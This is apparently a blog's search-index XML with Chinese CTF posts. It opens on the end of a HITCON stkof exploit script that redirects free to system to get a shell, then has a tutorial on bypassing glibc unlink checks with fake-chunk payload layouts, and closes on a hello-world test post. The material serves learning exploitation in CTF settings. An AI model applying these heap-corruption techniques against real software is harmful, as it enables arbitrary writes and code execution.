p32(system))#调用free，实际调用systemdelete_chunk(2)p.interactive()注意set_chunk函数中最后应该用send而非sendline，否则在发送的数据末尾会多出一个’\n’，而导致比预期多覆盖一个字节，在leak时会使chunk2的指针的一个字节被修改，最后free时导致无法getshell。若使用sendline，请在chunk1后再多加一个chunk来隔开存放’/bin/sh\x00’的chunk。unlink学习过程中应该着重弄清楚什么时候是地址、什么时候是值此题为32位程序，若是64位应将p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)改为p32(chunk_ptr-0x18) + p32(chunk_ptr-0x10)相关链接题目链接：heapHITCON CTF 2014-stkof]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>堆利用</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用学习之unlink]]></title>
    <url>%2Fpost%2Fdbc7b210.html</url>
    <content type="text"><![CDATA[原理unlink是内存操作中的一个宏， 用来从双向链表中取出一个free chunk，其过程中的指针操作存在任意写的漏洞。从双向链表中取出节点的过程，若是学过数据结构应该都比较清楚，主要代码是：12P-&gt;fd-&gt;bk = P-&gt;bkP-&gt;bk-&gt;fd = P-&gt;fd但是在unlink宏中，为了安全性还增加了一些检查：unlink源码：1234567891011if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); FD = P-&gt;fd;BK = P-&gt;bk;if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P);else &#123;FD-&gt;bk = BK;BK-&gt;fd = FD;...&#125;要利用该漏洞，先要绕过这里的两处检查（64位为例）第一处检查chunksize(P) != prev_size (next_chunk(P))，检查下一个chunk的prevsize是否等于当前chunk的size，所以需要通过溢出等手段设置下一chunk的prevsize第二处检查__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)，检查当前chunk是否是前一个chunk的后继，同时也是后一个chunk的前驱，也就是检查链表是否真的是链接好的。但是这个检查有个致命的缺点:因为FD-&gt;bk == *(FD+0x18)、BK-&gt;fd == *(BK+0x10)若在FD中存入&amp;P-0x18，那么表达式将变为FD-&gt;bk == *((&amp;P-0x18)+0x18) == *&amp;P == P若在BK中存入&amp;P-0x10，那么表达式将变为BK-&gt;fd == *((&amp;P-0x10)+0x10) == *&amp;P == P从而就绕过了检查注意：&amp;P是表示指向目标chunk的指针的地址绕过检查后，满足FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P，所以有：12FD-&gt;bk = BK; // P = &amp;P-0x10BK-&gt;fd = FD; // P = &amp;P-0x18在此之后，P就指向了比自己的地址低0x18个字节的位置，可以通过再次向P写入从而覆盖掉P本身，将其修改为任意地址，第三次向P写入则实现了任意地址写。触发前提堆指针是全局变量，或其地址是可泄露的能够free一个smallchunk或largechunk(可以是伪造的)能够控制下一chunk的prevsize和size利用过程（64位为例）法一存在堆溢出时：分配连续3个chunk a, b, c在a中伪造chunkp64(0) + p64(0x80) + p64(head_ptr-0x18) + p64(head_ptr-0x10) + padding覆盖b的prevsize和size，修改inuse位，使之可以与a合并p64(0x80) + p64(0x90)free掉b，触发unlink写入a，覆盖指针为任意地址，p64(0)*3 + p64(addr)再次写入a，任意地址写入法二不能溢出，但有double free分配连续3个fastchunk a, b, c释放a，此时并不会修改后面的inuse位和prevsize申请一个大内存，触发fastbin合并，这时会将fastbin中的a取出放入unsortedbin，可以实现对b的inuse位进行修改触发double free，将a再次释放，放入fastbin再申请与a相同大小的chunk，就会从fastbin中将a返回，同时不会改变b的inuse布置a内存，释放b，触发unlink题目一道典型的unlink例题HITCON CTF 2014-stkofHITCON CTF 2016-SleepyHolder]]></content>
      <categories>
        <category>堆利用学习</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[test]]></title>
    <url>%2Fpost%2Fd87f7e0c.html</url>
    <content type="text"><![CDATA[这是一个测试1234567#include &lt;stdio.h&gt;int main()&#123; printf("hello world"); return 0;&#125;]]></content>
  </entry>
</search>
